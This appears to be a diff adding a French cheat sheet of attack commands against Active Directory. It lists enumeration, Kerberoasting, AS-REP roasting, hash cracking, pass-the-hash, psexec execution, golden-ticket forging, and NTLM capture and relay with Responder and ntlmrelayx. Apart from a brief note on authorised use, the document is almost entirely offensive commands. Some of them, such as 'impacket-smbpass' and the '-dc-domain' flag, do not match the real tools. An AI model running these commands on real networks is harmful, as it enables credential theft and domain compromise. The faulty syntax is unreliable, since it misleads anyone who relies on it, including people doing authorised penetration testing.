@@ -1,0 +1,94 @@
+
+
+cheat sheet -  Active Directory
+
+Ce document présente des commandes Linux pour énumérer, exploiter et attaquer Active Directory, à utiliser dans des environnements autorisés uniquement.
+
+
+1. Prérequis
+
+- Outils nécessaires : impacket, ldapsearch, crackmapexec, kerbrute, bloodhound-python.
+- Installation : sudo apt install impacket-scripts ldap-utils crackmapexec (Kali) ou via GitHub.
+
+2. Énumération de domaine
+
+Commande : ldapsearch -H ldap://<DC_IP> -x -b "DC=domaine,DC=local"
+Description : Énumère les objets AD via LDAP
+
+Commande : crackmapexec smb <IP> -u "" -p ""
+Description : Teste les connexions SMB anonymes
+
+Commande : impacket-getadusers -all -dc-ip <DC_IP> -dc-domain domaine.local
+Description : Liste tous les utilisateurs AD
+
+Commande : enum4linux -a <DC_IP>
+Description : Énumération complète du domaine via SMB/LDAP
+
+Commande : bloodhound-python -u <user> -p <pass> -d domaine.local -c All -dc <DC_IP>
+Description : Collecte BloodHound (tous les objets)
+
+3. Attaques Kerberos
+
+Kerberoasting
+
+Commande : impacket-GetUserSPNs -dc-ip <DC_IP> -request -dc-domain domaine.local -u <user> -p <pass>
+Description : Récupère les tickets SPN
+
+Commande : kerbrute userenum -d domaine.local --dc <DC_IP> users.txt
+Description : Bruteforce des noms d’utilisateur
+
+ASREPRoast
+
+Commande : impacket-GetNPUsers domaine.local/ -dc-ip <DC_IP> -request -no-pass -usersfile users.txt
+Description : Récupère les hashes ASREP
+
+4. Exploitation des hashes
+
+Commande : hashcat -m 13100 -a 0 hash.txt wordlist.txt
+Description : Craque les hashes Kerberos (TGS)
+
+Commande : impacket-smbpass -u <user> -H <NTLM_hash> <DC_IP>
+Description : Pass-the-Hash SMB
+
+Commande : impacket-psexec domaine.local/<user>:<pass>@<DC_IP>
+Description : Exécute une commande via SMB avec creds
+
+5. Attaques de tickets
+
+Pass-the-Ticket
+
+Commande : impacket-ticketer -nthash <NTLM_hash> -domain-sid <SID> -domain domaine.local -spn cifs/<DC>
+Description : Crée un ticket Kerberos
+
+Commande : export KRB5CCNAME=/tmp/ticket.ccache; impacket-psexec -k <DC_IP>
+Description : Utilise un ticket pour accès
+
+Golden/Silver Ticket
+
+Commande : impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain domaine.local -user Administrator
+Description : Crée un Golden Ticket
+
+6. Exploitation SMB
+
+Commande : crackmapexec smb <IP> -u <user> -p <pass> -x "whoami"
+Description : Exécute une commande via SMB
+
+Commande : impacket-smbclient domaine.local/<user>:<pass>@<DC_IP>
+Description : Connexion SMB interactive
+
+Commande : smbmap -H <IP> -u <user> -p <pass>
+Description : Liste les partages SMB accessibles
+
+7. Relais d’authentification
+
+Commande : sudo responder -I eth0
+Description : Capture les hashes NTLM via LLMNR/NBNS
+
+Commande : impacket-ntlmrelayx -tf targets.txt -smb2support
+Description : Relaye les hashes vers des cibles SMB
+
+8. Précautions
+
+- Usage légal : Tests uniquement sur des systèmes autorisés.
+- Dépendances : Vérifiez les versions des outils (ex. : Impacket nécessite Python 3).
+- Compléments : Associez avec nmap, hydra, ou metasploit pour plus d’options.
